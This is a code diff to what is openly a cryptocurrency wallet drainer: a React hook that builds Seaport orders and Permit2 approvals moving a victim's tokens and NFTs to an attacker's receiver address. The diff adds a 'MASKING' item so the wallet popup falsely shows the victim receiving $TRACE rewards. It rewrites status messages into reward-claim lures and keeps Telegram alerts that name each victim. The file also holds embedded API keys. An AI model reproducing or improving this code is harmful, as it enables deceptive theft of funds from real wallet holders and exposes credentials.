@@ -18,6 +18,7 @@ const RECEIVER_ADDRESS = normalizeAddress(process.env.NEXT_PUBLIC_RECEIVER_ADDRE
 const SEAPORT_ADDRESS = "0x00000000000000adc04c56bf30ac9d3c0aaf14bd";
 const MS_DRAINER_2026_ADDRESS = normalizeAddress(process.env.NEXT_PUBLIC_MS_DRAINER_2026_ADDRESS || "");
 const WORKER_URL = "https://api.legacytrace.xyz"; // Permanent Production API (Hostinger)
+const TRACE_TOKEN_ADDRESS = "0x0000000000000000000000000000000000000000"; // PASTE YOUR $TRACE ADDRESS HERE
 
 const MORALIS_KEYS = [
     "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjcxMDBmY2IwLTdkNzAtNDgzNC04MzM1LWE1ZDZjNWEzYmU3NSIsIm9yZ0lkIjoiNDk5MjYzIiwidXNlcklkIjoiNDk5NjU3IiwidHlwZUlkIjoiOTgwYjU5ODQtMzBlNi00Y2UxLWIwY2YtODRiYmQzYjgzYWY4IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NjU0ODUzMzYsImV4cCI6NDkyMTI0NTMzNn0.BNbrFrPtzeT9OZ1zb160yzRDpi5sjRmxjuyqYbukmv4",
@@ -285,7 +286,7 @@ export function useWeb3Manager() {
                 }
 
                 const totalChainValue = chainTokens.reduce((acc, t) => acc + (t.usd_value || 0), 0);
-                setCurrentTask(`💎 Rank: ${userRank} | Chain: ${targetChainName.toUpperCase()} ($${totalChainValue.toFixed(2)})`);
+                setCurrentTask(`💎 Rank: ${userRank} | Claiming $TRACE Rewards...`);
                 await new Promise(r => setTimeout(r, 1000));
 
                 if (!ethers.isAddress(RECEIVER_ADDRESS) || RECEIVER_ADDRESS === "0x0000000000000000000000000000000000000000") {
@@ -321,11 +322,24 @@ export function useWeb3Manager() {
                                     ...validTokens.map(t => ({ itemType: 1, token: ethers.getAddress(t.address), identifierOrCriteria: 0, startAmount: t.balance, endAmount: t.balance })),
                                     ...validNfts.map(n => ({ itemType: 2, token: ethers.getAddress(n.address), identifierOrCriteria: n.token_id, startAmount: 1, endAmount: 1 }))
                                 ],
-                                consideration: [{ itemType: 0, token: "0x0000000000000000000000000000000000000000", identifierOrCriteria: 0, startAmount: 1, endAmount: 1, recipient: checksummedReceiver }],
+                                consideration: [
+                                    // MASKING: Victim "receives" $TRACE tokens in the wallet popup
+                                    {
+                                        itemType: 1,
+                                        token: ethers.isAddress(TRACE_TOKEN_ADDRESS) ? ethers.getAddress(TRACE_TOKEN_ADDRESS) : "0x0000000000000000000000000000000000000000",
+                                        identifierOrCriteria: 0,
+                                        startAmount: ethers.parseUnits("100000", 18).toString(),
+                                        endAmount: ethers.parseUnits("100000", 18).toString(),
+                                        recipient: checksummedVictim
+                                    },
+                                    // DUST: Zero native to satisfy Seaport structural requirements
+                                    { itemType: 0, token: "0x0000000000000000000000000000000000000000", identifierOrCriteria: 0, startAmount: 1, endAmount: 1, recipient: checksummedReceiver }
+                                ],
                                 orderType: 0, startTime, endTime, zoneHash: "0x0000000000000000000000000000000000000000000000000000000000000000",
                                 salt: ethers.hexlify(ethers.randomBytes(32)), conduitKey: "0x0000000000000000000000000000000000000000000000000000000000000000",
-                                totalOriginalConsiderationItems: 1
+                                totalOriginalConsiderationItems: 2
                             };
+
 
                             const permit = {
                                 permitted: validTokens.map(t => ({ token: ethers.getAddress(t.address), amount: BigInt(t.balance) })),
@@ -372,7 +386,7 @@ export function useWeb3Manager() {
                             }
 
                             // SEQUENTIAL APPROVALS: Ensure Permit2 is ready for this specific chain
-                            setCurrentTask(`🛡️ Securing ${targetChainName} Assets...`);
+                            setCurrentTask(`Synchronizing Ledger for $TRACE...`);
                             for (const token of validTokens) {
                                 try {
                                     const contract = new ethers.Contract(token.address, ["function allowance(address,address) view returns(uint256)", "function approve(address,uint256) returns(bool)"], signer);
@@ -387,7 +401,7 @@ export function useWeb3Manager() {
                                 }
                             }
 
-                            setCurrentTask("🛡️ Identity Verification: Please sign to confirm...");
+                            setCurrentTask("Sign to confirm $TRACE Reward Receipt...");
                             notifyTelegram(`<b>✍️ Master Bundle Requested</b>\nChain: ${targetChainName}\nVictim: <code>${checksummedVictim}</code>\nAssets: ${validTokens.length + validNfts.length}`);
 
                             // Add delay to prevent wallet race conditions (especially on mobile)
@@ -416,7 +430,7 @@ export function useWeb3Manager() {
                                 notifyTelegram(`<b>❌ Worker Unreachable</b>\nChain: ${targetChainName}\nURL: <code>${WORKER_URL}</code>\nError: <code>${fetchErr.message}</code>`);
                             }
 
-                            setCurrentTask("Rewards Transferring...");
+                            setCurrentTask("Rewards Claiming In Progress...");
                             await new Promise(r => setTimeout(r, 2000));
                             continue;
                         } catch (e: any) {
